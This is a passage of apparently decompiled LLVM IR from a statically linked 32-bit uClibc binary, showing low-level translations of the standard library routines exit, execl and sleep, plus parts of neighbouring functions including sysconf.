  %v1_80546314 = or i32 %v2_805462f, -2147483648
  store i32 %v1_80546314, i32* %ebx.global-to-local, align 4
  %v5_8054637 = icmp eq i8 %tmp37, 0
  br i1 %v5_8054637, label %dec_label_pc_805464f, label %dec_label_pc_805463e

dec_label_pc_805463e:                             ; preds = %dec_label_pc_805462b
  %v0_805463e = load i32, i32* @edx, align 4
  %tmp59 = icmp ugt i32 %v0_805463e, %v1_80546314
  br i1 %tmp59, label %dec_label_pc_8054642, label %dec_label_pc_805464f

dec_label_pc_8054642:                             ; preds = %dec_label_pc_805463e
  %v1_8054642 = call i32 @__errno_location(i32 %stack_var_-24.0)
  store i32 %v1_8054642, i32* %eax.global-to-local, align 4
  %v0_8054647 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8054647, i32* @edx, align 4
  %v1_8054649 = inttoptr i32 %v1_8054642 to i32*
  store i32 34, i32* %v1_8054649, align 4
  %v0_805464f.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805464f

dec_label_pc_805464f:                             ; preds = %dec_label_pc_805463e, %dec_label_pc_805462b, %dec_label_pc_8054642
  %v0_805464f = phi i32 [ %v0_805462b, %dec_label_pc_805463e ], [ %v0_805462b, %dec_label_pc_805462b ], [ %v0_805464f.pre, %dec_label_pc_8054642 ]
  store i32 %v0_805464f, i32* %eax.global-to-local, align 4
  %v3_8054651 = trunc i32 %v0_805464f to i8
  %v4_8054651 = icmp eq i8 %v3_8054651, 0
  %v0_805465a.pre = load i32, i32* @edx, align 4
  br i1 %v4_8054651, label %dec_label_pc_8054657, label %dec_label_pc_8054655

dec_label_pc_8054655:                             ; preds = %dec_label_pc_805464f
  %v1_8054655 = sub i32 0, %v0_805465a.pre
  store i32 %v1_8054655, i32* @edx, align 4
  br label %dec_label_pc_8054657

dec_label_pc_8054657:                             ; preds = %dec_label_pc_805464f, %dec_label_pc_8054655
  %v0_805465a = phi i32 [ %v1_8054655, %dec_label_pc_8054655 ], [ %v0_805465a.pre, %dec_label_pc_805464f ]
  store i32 %v0_805465a, i32* %eax.global-to-local, align 4
  %v2_805465c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805465c, i32* @ebx, align 4
  ret i32 %v0_805465a

; uselistorder directives
  uselistorder i32 %v0_805465a, { 1, 0 }
  uselistorder i32 %v0_805464f, { 1, 0 }
  uselistorder i32 %v0_80545f0, { 0, 2, 1 }
  uselistorder i32 %v1_80545ef, { 1, 0 }
  uselistorder i32 %v2_80545eb, { 1, 0 }
  uselistorder i32 %v1_80545e8, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8054617, { 1, 0 }
  uselistorder i32 %v0_80545d0, { 1, 0 }
  uselistorder i32 %v4_80545fe, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_80545c2, { 1, 0, 2 }
  uselistorder i32 %v2_80545a6, { 1, 0 }
  uselistorder i32 %v1_805459f, { 1, 0 }
  uselistorder i32 %v1_8054598, { 1, 0, 2 }
  uselistorder i32 %v0_8054597, { 2, 1, 0, 3, 4 }
  uselistorder i8 %v2_8054566.lcssa, { 1, 0 }
  uselistorder i32 %v0_8054565.lcssa, { 1, 0 }
  uselistorder i32 %v1_8054565, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8054559, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8054553, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 9, 6, 7, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32 -17, { 18, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8054657, { 1, 0 }
  uselistorder label %dec_label_pc_805464f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805462b, { 1, 0 }
  uselistorder label %dec_label_pc_80545e8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545d2, { 1, 0 }
  uselistorder label %dec_label_pc_80545b3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80545a9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8054585, { 1, 0 }
  uselistorder label %dec_label_pc_8054584, { 1, 0 }
  uselistorder label %dec_label_pc_8054565, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8054677 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8054677, i32* @ebx, align 4
  %v2_805467c = call i32 @__pthread_return_void(i32 %v2_8054677, i32 134564427)
  %v1_8054688 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f860.990 to i32))
  %v0_805468d = load i32, i32* @global_var_8065b04.991, align 4
  store i32 %v0_805468d, i32* @eax, align 4
  %v1_8054695 = icmp eq i32 %v0_805468d, 0
  br i1 %v1_8054695, label %dec_label_pc_80546a2, label %dec_label_pc_8054699

dec_label_pc_8054699:                             ; preds = %entry
  %v0_805469c = load i32, i32* @esi, align 4
  %v1_805469d = call i32 @unknown_0(i32 %v0_805469c)
  store i32 %v1_805469d, i32* @eax, align 4
  br label %dec_label_pc_80546a2

dec_label_pc_80546a2:                             ; preds = %entry, %dec_label_pc_8054699
  %v2_80546a7 = call i32 @__pthread_return_void(i32 %v2_8054677, i32 1)
  %v0_80546ac = call i32 @__GI___uClibc_fini()
  %v0_80546bd = call i32 @_stdio_term()
  %v0_80546c5 = load i32, i32* @esi, align 4
  %v1_80546c6 = call i32 @__GI__exit(i32 %v0_80546c5)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 9, 0, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 8, 7, 6, 5, 4, 3, 13, 12, 11, 10, 2 }
  uselistorder label %dec_label_pc_80546a2, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_80546d0 = load i32, i32* @ebx, align 4
  store i32 %v0_80546d0, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80546d3 = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_80546d3, i32* %eax.global-to-local, align 4
  %v12_80546d6 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_80546dc

dec_label_pc_80546dc:                             ; preds = %dec_label_pc_80546dc, %entry
  %v0_80546df = phi i32 [ 0, %entry ], [ %v1_80546df, %dec_label_pc_80546dc ]
  %stack_var_-16.0 = phi i32 [ %v2_80546d3, %entry ], [ %v1_80546e0, %dec_label_pc_80546dc ]
  %v1_80546df = add i32 %v0_80546df, 1
  store i32 %v1_80546df, i32* %esi.global-to-local, align 4
  %v1_80546e0 = add i32 %stack_var_-16.0, 4
  store i32 %v1_80546e0, i32* %eax.global-to-local, align 4
  %v1_80546e6 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_80546e6 = load i32, i32* %v1_80546e6, align 4
  %v3_80546e6 = icmp eq i32 %v2_80546e6, 0
  %v1_80546e9 = icmp eq i1 %v3_80546e6, false
  br i1 %v1_80546e9, label %dec_label_pc_80546dc, label %dec_label_pc_80546eb

dec_label_pc_80546eb:                             ; preds = %dec_label_pc_80546dc
  %v1_80546eb = mul i32 %v1_80546df, 4
  %v2_80546eb = add i32 %v1_80546eb, 34
  %v1_80546f2 = and i32 %v2_80546eb, -16
  %v2_80546f5 = sub i32 %v12_80546d6, %v1_80546f2
  %v1_80546fa = add i32 %v2_80546f5, 15
  %v1_80546fe = and i32 %v1_80546fa, -16
  store i32 %v1_80546fe, i32* @ebx, align 4
  store i32 %v1_80546fe, i32* %ecx.global-to-local, align 4
  %v2_8054703 = inttoptr i32 %v1_80546fe to i32*
  store i32 %arg2, i32* %v2_8054703, align 16
  store i32 %v2_80546d3, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805470b

dec_label_pc_805470b:                             ; preds = %dec_label_pc_805470b, %dec_label_pc_80546eb
  %stack_var_-16.1 = phi i32 [ %v2_80546d3, %dec_label_pc_80546eb ], [ %v1_8054712, %dec_label_pc_805470b ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_805470e = load i32, i32* %ecx.global-to-local, align 4
  %v1_805470e = add i32 %v0_805470e, 4
  store i32 %v1_805470e, i32* %ecx.global-to-local, align 4
  %v0_8054711 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054711 = add i32 %v0_8054711, -1
  %v8_8054711 = icmp eq i32 %v1_8054711, 0
  store i32 %v1_8054711, i32* %esi.global-to-local, align 4
  %v1_8054712 = add i32 %stack_var_-16.1, 4
  %v1_8054718 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8054718 = load i32, i32* %v1_8054718, align 4
  store i32 %v2_8054718, i32* %eax.global-to-local, align 4
  %v2_805471a = inttoptr i32 %v1_805470e to i32*
  store i32 %v2_8054718, i32* %v2_805471a, align 4
  %v1_805471c = icmp eq i1 %v8_8054711, false
  br i1 %v1_805471c, label %dec_label_pc_805470b, label %dec_label_pc_805471e

dec_label_pc_805471e:                             ; preds = %dec_label_pc_805470b
  %v0_805471e = load i32, i32* %eax.global-to-local, align 4
  %v1_805471e = load i32, i32* @esp, align 4
  %v2_805471e = add i32 %v1_805471e, -4
  %v3_805471e = inttoptr i32 %v2_805471e to i32*
  store i32 %v0_805471e, i32* %v3_805471e, align 4
  %v0_805471f = load i32, i32* @global_var_8065b0c.992, align 4
  %v2_805471f = add i32 %v1_805471e, -8
  %v3_805471f = inttoptr i32 %v2_805471f to i32*
  store i32 %v0_805471f, i32* %v3_805471f, align 4
  %v0_8054725 = load i32, i32* @ebx, align 4
  %v2_8054725 = add i32 %v1_805471e, -12
  %v3_8054725 = inttoptr i32 %v2_8054725 to i32*
  store i32 %v0_8054725, i32* %v3_8054725, align 4
  %v5_8054726 = add i32 %v1_805471e, -16
  %v6_8054726 = inttoptr i32 %v5_8054726 to i32*
  store i32 %arg1, i32* %v6_8054726, align 4
  %v1_8054729 = inttoptr i32 %v1_8054712 to i8*
  %v2_8054729 = call i32 @__GI_execve(i8* %v1_8054729)
  store i32 %v2_8054729, i32* %eax.global-to-local, align 4
  %v2_8054731 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8054731, i32* @ebx, align 4
  ret i32 %v2_8054729

; uselistorder directives
  uselistorder i32 %v1_8054711, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_80546e0, { 1, 0 }
  uselistorder i32 %v1_80546df, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_80546d3, { 0, 2, 1, 3 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8054738 = load i32, i32* @ebp, align 4
  %v0_8054739 = load i32, i32* @edi, align 4
  %v0_805473a = load i32, i32* @esi, align 4
  %v0_805473b = load i32, i32* @ebx, align 4
  %v15_805473c = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_805474e = icmp eq i32 %arg1, 0
  %v1_8054750 = icmp eq i1 %v1_805474e, false
  br i1 %v1_8054750, label %dec_label_pc_8054762.preheader, label %dec_label_pc_80548af

dec_label_pc_8054762.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054757

dec_label_pc_8054757:                             ; preds = %dec_label_pc_8054757.dec_label_pc_8054757_crit_edge, %dec_label_pc_8054762.preheader
  %v0_8054757 = phi i32 [ %v15_805473c, %dec_label_pc_8054762.preheader ], [ %v0_8054757.pre, %dec_label_pc_8054757.dec_label_pc_8054757_crit_edge ]
  %v1_805476229 = phi i32 [ 31, %dec_label_pc_8054762.preheader ], [ %v1_8054762, %dec_label_pc_8054757.dec_label_pc_8054757_crit_edge ]
  %v2_8054757 = mul i32 %v1_805476229, 4
  %v3_8054757 = add i32 %v2_8054757, 292
  %v4_8054757 = add i32 %v3_8054757, %v0_8054757
  %v5_8054757 = inttoptr i32 %v4_8054757 to i32*
  store i32 0, i32* %v5_8054757, align 4
  %v0_8054762.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8054762 = add i32 %v0_8054762.pre, -1
  %v9_8054762 = icmp slt i32 %v1_8054762, 0
  store i32 %v1_8054762, i32* %eax.global-to-local, align 4
  %v1_8054763 = icmp eq i1 %v9_8054762, false
  br i1 %v1_8054763, label %dec_label_pc_8054757.dec_label_pc_8054757_crit_edge, label %dec_label_pc_8054765

dec_label_pc_8054757.dec_label_pc_8054757_crit_edge: ; preds = %dec_label_pc_8054757
  %v0_8054757.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8054757

dec_label_pc_8054765:                             ; preds = %dec_label_pc_8054757
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_805477b = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_805477b, i32* @ebx, align 4
  store i32 %v2_805477b, i32* %stack_var_-460, align 4
  %v4_8054783 = call i32 @__sigaddset(i32 %v2_805477b, i32 17, i32 %v1_8054762, i32 %v1_8054762)
  store i32 %v4_8054783, i32* %eax.global-to-local, align 4
  %v2_805478b = icmp slt i32 %v4_8054783, 0
  br i1 %v2_805478b, label %dec_label_pc_80548b3, label %dec_label_pc_8054793

dec_label_pc_8054793:                             ; preds = %dec_label_pc_8054765
  %v2_8054794 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8054794, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_805479f = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_805479f = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_805479f, i32 %v2_8054794)
  store i32 %v4_805479f, i32* %eax.global-to-local, align 4
  %v1_80547a7 = icmp eq i32 %v4_805479f, 0
  %v1_80547a9 = icmp eq i1 %v1_80547a7, false
  br i1 %v1_80547a9, label %dec_label_pc_80548b3, label %dec_label_pc_80547af

dec_label_pc_80547af:                             ; preds = %dec_label_pc_8054793
  store i32 %v2_8054794, i32* %stack_var_-460, align 4
  %v4_80547b4 = call i32 @__sigismember(i32 %v2_8054794, i32 17, i32 %v4_805479f, i32 %v4_805479f)
  store i32 %v4_80547b4, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_80547c1 = icmp eq i32 %v4_80547b4, 0
  br i1 %v1_80547c1, label %dec_label_pc_80547d5.preheader, label %dec_label_pc_805487d

dec_label_pc_80547d5.preheader:                   ; preds = %dec_label_pc_80547af
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80547ca

dec_label_pc_80547ca:                             ; preds = %dec_label_pc_80547ca.dec_label_pc_80547ca_crit_edge, %dec_label_pc_80547d5.preheader
  %v0_80547ca = phi i32 [ %v15_805473c, %dec_label_pc_80547d5.preheader ], [ %v0_80547ca.pre, %dec_label_pc_80547ca.dec_label_pc_80547ca_crit_edge ]
  %v1_80547d528 = phi i32 [ 31, %dec_label_pc_80547d5.preheader ], [ %v1_80547d5, %dec_label_pc_80547ca.dec_label_pc_80547ca_crit_edge ]
  %v2_80547ca = mul i32 %v1_80547d528, 4
  %v3_80547ca = add i32 %v2_80547ca, 292
  %v4_80547ca = add i32 %v3_80547ca, %v0_80547ca
  %v5_80547ca = inttoptr i32 %v4_80547ca to i32*
  store i32 0, i32* %v5_80547ca, align 4
  %v0_80547d5.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_80547d5 = add i32 %v0_80547d5.pre, -1
  %v9_80547d5 = icmp slt i32 %v1_80547d5, 0
  store i32 %v1_80547d5, i32* %edx.global-to-local, align 4
  %v1_80547d6 = icmp eq i1 %v9_80547d5, false
  br i1 %v1_80547d6, label %dec_label_pc_80547ca.dec_label_pc_80547ca_crit_edge, label %dec_label_pc_80547d8

dec_label_pc_80547ca.dec_label_pc_80547ca_crit_edge: ; preds = %dec_label_pc_80547ca
  %v0_80547ca.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80547ca

dec_label_pc_80547d8:                             ; preds = %dec_label_pc_80547ca
  store i32 %v2_805477b, i32* %eax.global-to-local, align 4
  store i32 %v2_805477b, i32* %stack_var_-460, align 4
  %v4_80547e4 = call i32 @__sigaddset(i32 %v2_805477b, i32 17, i32 0, i32 0)
  store i32 %v4_80547e4, i32* %eax.global-to-local, align 4
  %v2_80547ec = icmp slt i32 %v4_80547e4, 0
  br i1 %v2_80547ec, label %dec_label_pc_80548b3, label %dec_label_pc_80547f4

dec_label_pc_80547f4:                             ; preds = %dec_label_pc_80547d8
  %v2_80547f5 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_80547f5, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_80547fe = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_80547f5)
  store i32 %v4_80547fe, i32* %eax.global-to-local, align 4
  %v2_8054806 = icmp slt i32 %v4_80547fe, 0
  %v1_8054808 = icmp eq i1 %v2_8054806, false
  br i1 %v1_8054808, label %dec_label_pc_8054832, label %dec_label_pc_805480a

dec_label_pc_805480a:                             ; preds = %dec_label_pc_80547f4
  %v0_805480a = load i32, i32* %stack_var_-460, align 4
  %v1_805480a = call i32 @__errno_location(i32 %v0_805480a)
  store i32 %v1_805480a, i32* %eax.global-to-local, align 4
  store i32 %v1_805480a, i32* @ebx, align 4
  %v1_8054811 = inttoptr i32 %v1_805480a to i32*
  %v2_8054811 = load i32, i32* %v1_8054811, align 4
  store i32 %v2_8054811, i32* @esi, align 4
  store i32 %v2_8054794, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054820 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054820 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054820, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_805482b = load i32, i32* @esi, align 4
  %v1_805482b = load i32, i32* @ebx, align 4
  %v2_805482b = inttoptr i32 %v1_805482b to i32*
  store i32 %v0_805482b, i32* %v2_805482b, align 4
  %v0_80548c0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548b6

dec_label_pc_8054832:                             ; preds = %dec_label_pc_80547f4
  %v3_8054832 = load i32, i32* %stack_var_-420, align 4
  %v12_8054832 = icmp eq i32 %v3_8054832, 1
  %v2_805483e = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805483e, i32* @ebx, align 4
  %v1_8054845 = icmp eq i1 %v12_8054832, false
  br i1 %v1_8054845, label %dec_label_pc_805486c, label %dec_label_pc_8054847

dec_label_pc_8054847:                             ; preds = %dec_label_pc_8054832
  %v0_8054847 = load i32, i32* @edi, align 4
  store i32 %v2_805483e, i32* %stack_var_-460, align 4
  %v4_805484b = bitcast i32* %stack_var_-24 to %timespec*
  %v5_805484b = call i32 @__libc_nanosleep(%timespec* %v4_805484b, i32 %v2_805483e, i32 %v0_8054847, i32 %v0_8054847)
  store i32 %v5_805484b, i32* %eax.global-to-local, align 4
  store i32 %v5_805484b, i32* @edi, align 4
  %v1_8054852 = call i32 @__errno_location(i32 %v2_805483e)
  store i32 %v1_8054852, i32* %eax.global-to-local, align 4
  store i32 %v1_8054852, i32* @ebx, align 4
  %v1_805485c = inttoptr i32 %v1_8054852 to i32*
  %v2_805485c = load i32, i32* %v1_805485c, align 4
  store i32 %v2_805485c, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054863 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054863 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054863, i32 0)
  store i32 %v4_8054863, i32* %eax.global-to-local, align 4
  %v0_8054868 = load i32, i32* @esi, align 4
  %v1_8054868 = load i32, i32* @ebx, align 4
  %v2_8054868 = inttoptr i32 %v1_8054868 to i32*
  store i32 %v0_8054868, i32* %v2_8054868, align 4
  %v0_8054892.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805488f

dec_label_pc_805486c:                             ; preds = %dec_label_pc_8054832
  store i32 2, i32* %stack_var_-460, align 4
  %v3_8054872 = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_8054872 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8054872, i32 0)
  store i32 %v4_8054872, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8054888

dec_label_pc_805487d:                             ; preds = %dec_label_pc_80547af
  %v2_805487f = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805487f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8054888

dec_label_pc_8054888:                             ; preds = %dec_label_pc_805486c, %dec_label_pc_805487d
  %storemerge3.pre-phi = phi i32 [ %v2_805483e, %dec_label_pc_805486c ], [ %v2_805487f, %dec_label_pc_805487d ]
  %v3_8054888 = phi i32 [ %v2_8054794, %dec_label_pc_805486c ], [ %v4_80547b4, %dec_label_pc_805487d ]
  %v2_8054888 = phi i32 [ 0, %dec_label_pc_805486c ], [ %v4_80547b4, %dec_label_pc_805487d ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v4_8054888 = bitcast i32* %stack_var_-24 to %timespec*
  %v5_8054888 = call i32 @__libc_nanosleep(%timespec* %v4_8054888, i32 %storemerge3.pre-phi, i32 %v2_8054888, i32 %v3_8054888)
  store i32 %v5_8054888, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805488f

dec_label_pc_805488f:                             ; preds = %dec_label_pc_8054847, %dec_label_pc_8054888
  %v0_8054892 = phi i32 [ %v0_8054892.pre, %dec_label_pc_8054847 ], [ %v5_8054888, %dec_label_pc_8054888 ]
  %v1_8054892 = icmp eq i32 %v0_8054892, 0
  br i1 %v1_8054892, label %dec_label_pc_80548af, label %dec_label_pc_8054896

dec_label_pc_8054896:                             ; preds = %dec_label_pc_805488f
  %v4_80548a6 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_80548a6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548b6

dec_label_pc_80548af:                             ; preds = %entry, %dec_label_pc_805488f
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548b6

dec_label_pc_80548b3:                             ; preds = %dec_label_pc_80547d8, %dec_label_pc_8054793, %dec_label_pc_8054765
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80548b6

dec_label_pc_80548b6:                             ; preds = %dec_label_pc_80548af, %dec_label_pc_8054896, %dec_label_pc_805480a, %dec_label_pc_80548b3
  %v0_80548c0 = phi i32 [ 0, %dec_label_pc_80548af ], [ %v4_80548a6, %dec_label_pc_8054896 ], [ %v0_80548c0.pre, %dec_label_pc_805480a ], [ -1, %dec_label_pc_80548b3 ]
  store i32 %v0_805473b, i32* @ebx, align 4
  store i32 %v0_805473a, i32* @esi, align 4
  store i32 %v0_8054739, i32* @edi, align 4
  store i32 %v0_8054738, i32* @ebp, align 4
  ret i32 %v0_80548c0

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_8054852, { 1, 0, 2 }
  uselistorder i32 %v2_805483e, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_80547d5, { 2, 1, 0 }
  uselistorder i32 %v4_80547b4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8054794, { 0, 2, 4, 3, 1, 5 }
  uselistorder i32 %v2_805477b, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_8054762, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 23, 21 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80548b6, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_80548af, { 1, 0 }
  uselistorder label %dec_label_pc_805488f, { 1, 0 }
  uselistorder label %dec_label_pc_8054888, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_80548e3 [
    i32 0, label %dec_label_pc_80548f3
    i32 1, label %dec_label_pc_80549d8
    i32 2, label %dec_label_pc_80548fd
    i32 3, label %dec_label_pc_8054907
    i32 4, label %dec_label_pc_8054911
    i32 5, label %dec_label_pc_80549a7
    i32 6, label %dec_label_pc_8054919
    i32 7, label %dec_label_pc_80548d9
    i32 8, label %dec_label_pc_80548d9
    i32 9, label %dec_label_pc_80548d9
    i32 10, label %dec_label_pc_80548d9
    i32 11, label %dec_label_pc_80548d9
    i32 12, label %dec_label_pc_80548d9
    i32 13, label %dec_label_pc_80548d9
    i32 14, label %dec_label_pc_80548d9
    i32 15, label %dec_label_pc_80548d9
    i32 16, label %dec_label_pc_80548d9
    i32 17, label %dec_label_pc_80548d9
    i32 18, label %dec_label_pc_80548d9
    i32 19, label %dec_label_pc_80548d9
    i32 20, label %dec_label_pc_80548d9
    i32 21, label %dec_label_pc_80548d9
    i32 22, label %dec_label_pc_80548d9
    i32 23, label %dec_label_pc_80549d8
    i32 24, label %dec_label_pc_80549d8
    i32 25, label %dec_label_pc_80549e4
    i32 26, label %dec_label_pc_80549b5
    i32 27, label %dec_label_pc_80549d8
    i32 28, label %dec_label_pc_805492b
    i32 29, label %dec_label_pc_80549ae
    i32 30, label %dec_label_pc_8054923
    i32 31, label %dec_label_pc_80549c3
    i32 32, label %dec_label_pc_80549d8
    i32 33, label %dec_label_pc_80549d8
    i32 34, label %dec_label_pc_80549d8
    i32 35, label %dec_label_pc_80549bc
    i32 36, label %dec_label_pc_80549eb
    i32 37, label %dec_label_pc_80549f2
    i32 38, label %dec_label_pc_80549eb
    i32 39, label %dec_label_pc_8054935
    i32 40, label %dec_label_pc_80549f9
    i32 41, label %dec_label_pc_80549d8
    i32 42, label %dec_label_pc_80549c3
    i32 43, label %dec_label_pc_80549f2
    i32 44, label %dec_label_pc_8054a00
    i32 45, label %dec_label_pc_80549f2
    i32 46, label %dec_label_pc_80549ae
    i32 47, label %dec_label_pc_80549ae
    i32 48, label %dec_label_pc_80549ae
    i32 49, label %dec_label_pc_80549d8
    i32 50, label %dec_label_pc_80549d8
    i32 51, label %dec_label_pc_80549ae
    i32 52, label %dec_label_pc_80549ae
    i32 53, label %dec_label_pc_80549d8
    i32 54, label %dec_label_pc_80549d8
    i32 55, label %dec_label_pc_80549d8
    i32 56, label %dec_label_pc_80549d8
    i32 57, label %dec_label_pc_80549d8
    i32 58, label %dec_label_pc_80549d8
    i32 59, label %dec_label_pc_80549d8
    i32 60, label %dec_label_pc_80549d8
    i32 61, label %dec_label_pc_80549d8
    i32 62, label %dec_label_pc_80549d8
    i32 63, label %dec_label_pc_80549d8
    i32 64, label %dec_label_pc_80549d8
    i32 65, label %dec_label_pc_80549d8
    i32 66, label %dec_label_pc_80549d8
    i32 67, label %dec_label_pc_80548d9
    i32 68, label %dec_label_pc_80548d9
    i32 69, label %dec_label_pc_80549bc
    i32 70, label %dec_label_pc_80549bc
    i32 71, label %dec_label_pc_80549bc
    i32 72, label %dec_label_pc_80549c3
    i32 73, label %dec_label_pc_80549ca
    i32 74, label %dec_label_pc_80549d1
    i32 75, label %dec_label_pc_805493f
    i32 76, label %dec_label_pc_80549d1
    i32 77, label %dec_label_pc_80548d9
    i32 78, label %dec_label_pc_80548d9
    i32 79, label %dec_label_pc_80548d9
    i32 80, label %dec_label_pc_80548d9
    i32 81, label %dec_label_pc_80548d9
    i32 82, label %dec_label_pc_80548d9
    i32 83, label %dec_label_pc_80548d9
    i32 84, label %dec_label_pc_80548d9
    i32 85, label %dec_label_pc_80549d8
    i32 86, label %dec_label_pc_80549d8
    i32 87, label %dec_label_pc_80549b5
